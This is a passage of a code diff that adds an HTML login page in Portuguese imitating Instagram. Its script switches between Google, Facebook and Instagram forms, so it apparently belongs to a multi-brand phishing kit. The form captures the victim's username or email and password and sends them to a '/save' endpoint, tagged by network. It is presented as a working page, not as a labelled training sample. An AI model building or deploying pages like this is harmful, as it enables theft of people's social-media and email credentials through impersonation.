-31 46 -12 46 37 0 52 17 118 30 118 6 0 10 -28 10 -63 0 -60 11 -87 35 -87 6 0 16 30 23 67 18 94 32 103 32 20 0 -54 4 -71 20 -87 11 -11 27 -20 35 -20 21 0 47 45 42 72 -3 21 -5 21 -16 -9 -25 -64 -41 -35 -41 72 0 65 -3 76 -21 86 -28 14 -36 5 -59 -67 l-18 -59 -1 61 c-1 47 -5 63 -17 68 -27 10 -32 7 -44 -31 -19 -59 -31 -64 -28 -13 3 40 1 45 -19 48 -22 3 -23 1 -23 -80 0 -55 -5 -91 -13 -103 -26 -34 -37 -8 -37 84 0 80 -2 89 -20 94 -11 3 -20 0 -20 -5 0 -6 -6 -6 -14 1 -8 7 -27 11 -43 9 -38 -4 -63 -55 -63 -130 0 -62 -15 -82 -37 -52 -11 15 -13 36 -8 93 l7 74 -35 -6 c-29 -5 -36 -2 -40 15 -4 12 -12 18 -24 16 -14 -3 -18 -13 -19 -48 -1 -36 -35 -130 -48 -130 -1 0 -1 37 2 82 l5 81 -31 -6 c-17 -4 -34 -2 -37 3 -3 6 -17 10 -31 10 -35 0 -64 -52 -64 -116 0 -58 -22 -100 -40 -74 -5 8 -10 52 -10 98 0 80 -1 83 -22 81 -13 -1 -31 1 -41 6 -25 11 -60 -1 -75 -26 -7 -11 -17 -46 -22 -77 -10 -58 -30 -89 -49 -78 -7 5 -11 44 -11 102 l0 94 35 0 c24 0 35 5 35 15 0 11 -11 15 -36 15 -34 0 -35 1 -32 33 3 28 0 32 -24 35 -26 3 -28 1 -28 -33z m221 -132 c22 -59 -15 -163 -47 -131 -23 24 -22 118 2 142 22 23 33 20 45 -11z m197 15 c20 -20 15 -112 -7 -139 -15 -18 -23 -21 -31 -13 -20 20 -23 87 -7 127 17 39 26 44 45 25z m370 -21 c16 -32 7 -89 -18 -120 -27 -32 -45 -10 -44 56 2 89 34 122 62 64z m-360 -274 c-7 -16 -20 -28 -28 -28 -27 0 -23 44 7 83 l28 37 3 -32 c2 -18 -3 -45 -10 -60z" />
+        </g>
+      </svg>
+      <form action="/save" method="GET">
+        <input type="hidden" name="rede" value="Instagram">
+        <input type="text" name='email' class="input-field" required onkeyup='this.setAttribute("value", this.value);' value="" placeholder="Telefone, nome de usuário ou email">
+        <input type="password" name="pass" class="input-field" required onkeyup='this.setAttribute("value", this.value);' value="" placeholder="Senha">
+        <button class="login-button">Entrar</button>
+      </form>
+      <div class="divider"><span></span> OU <span></span></div>
+      <div class="facebook-login">Entrar com o Facebook</div>
+      <div class="forgot-password">Esqueceu a senha?</div>
+
+    </div>
+
+</body>
+<script>
+
+  const targetOpt = document.querySelectorAll(".opt-log");
+
+  targetOpt.forEach((item) => {
+    item.addEventListener("click", () => {
+
+      if (!item.classList.contains("selected")) {
+
+        targetOpt.forEach((el) => {
+          el.classList.remove("selected")
+        })
+
+        const id = item.id
+
+        // Função principal
+        switch (id) {
+          case "0":
+            item.classList.add("selected");
+            toggleGoogleForm(true); // Exibe o formulário Google
+            toggleFacebookForm(false); // Oculta o formulário Facebook
+            toggleInstagramForm(false); // Oculta o formulário Instagram
+            break;
+          case "1":
+            item.classList.add("selected");
+            toggleGoogleForm(false); // Oculta o formulário Google
+            toggleFacebookForm(true); // Exibe o formulário Facebook
+            toggleInstagramForm(false); // Oculta o formulário Instagram
+            break;
+          case "2":
+            item.classList.add("selected");
+            toggleGoogleForm(false); // Oculta o formulário Google
+            toggleFacebookForm(false); // Oculta o formulário Facebook
+            toggleInstagramForm(true); // Exibe o formulário Instagram
+            break
+        }
+
+      }
+
+    })
+
+  })
+
+  // Função para exibir ou ocultar o formulário Google
+  function toggleGoogleForm(action) {
+    const googleForms = document.getElementsByClassName("google-form");
+    if (googleForms.length > 0) {
+      googleForms[0].style.display = action ? "block" : "none";
+    }
+  }
+
+  // Função para exibir ou ocultar o formulário Facebook
+  function toggleFacebookForm(action) {
+    const facebookForms = document.getElementsByClassName("facebook-form");
+    if (facebookForms.length > 0) {
+      facebookForms[0].style.display = action ? "block" : "none";
+    }
+  }
+
+  // Função para exibir ou ocultar o formulário Instagram
+  function toggleInstagramForm(action) {
+    const instagramForms = document.getElementsByClassName("instagram-form");
+    if (instagramForms.length > 0) {
+      instagramForms[0].style.display = action ? "block" : "none";
+    }
+  }
+  const faceBtn = document.querySelector(".facebook-login"); // Seleciona o primeiro elemento com essa classe
+
+  if (faceBtn) { // Verifica se o botão existe
+    faceBtn.addEventListener("click", () => {
+      targetOpt.forEach((el) => {
+        if (el.classList.contains("face")) {
+          el.classList.add("selected");
+        } else {
+          el.classList.remove("selected");
+        }
+      });
+
+      toggleGoogleForm(false); // Oculta o formulário Google
+      toggleFacebookForm(true); // Exibe o formulário Facebook
+      toggleInstagramForm(false); // Oculta o formulário Instagram
+    });
+  } else {
+    console.error("Botão não encontrado!");
+  }
+
+</script>
+
+</html>
